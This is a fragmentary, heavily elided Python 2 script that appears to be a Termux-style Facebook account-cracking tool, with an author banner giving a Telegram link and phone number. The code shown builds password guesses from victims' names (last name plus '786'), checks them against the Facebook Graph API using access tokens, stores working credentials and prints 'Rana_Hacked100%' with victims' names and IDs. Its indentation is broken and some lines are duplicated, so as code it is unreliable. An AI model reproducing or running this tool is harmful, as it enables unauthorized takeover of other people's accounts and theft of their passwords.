...
 YouTube     : Termux Master/Hacker
 Telegram    : https://t.me/ranagrana5214
 whatsap.     :03082503426
--------------------------------------------------
"""
def tik():
...
def login_fb():
	...
	if "loc" in q:
		...
		time.sleep(1)
		print("\t    \033[1;32mEntery successfully\033[0;97m")
		time.sleep(1)
		menu()
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[1;94m[  ✓  ] \x1b[1;92mRana_Hacked100%]'											
				...
				oks.append(user+pass1)
				    ...
				    print '\x1b[1;94m[ ❥ ] \x1b[1;94mRana_Cp]'
										                           ...
										                           pass6 = b['last_name'] + '786'											
										                                   ...
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
										                                       ...
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;94m[  ✓  ] \x1b[1;92mRana_Hack100%]'			
											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user	
